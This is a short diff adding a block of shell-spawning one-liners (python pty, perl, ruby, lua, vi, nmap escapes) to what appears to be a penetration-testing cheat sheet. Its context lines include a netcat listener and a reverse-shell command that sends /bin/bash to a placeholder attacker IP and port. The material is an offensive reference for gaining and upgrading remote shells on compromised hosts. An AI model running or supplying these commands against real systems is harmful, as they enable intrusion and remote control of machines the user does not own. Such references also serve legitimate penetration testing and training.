@@ -1969,6 +1969,22 @@ nc -nvlp <PORT>
 nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
 ```
 
+```bash
+# Spawn shells
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+IRB: exec "/bin/sh"
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh
+```
+
 ### Frameworks
 
 ```bash
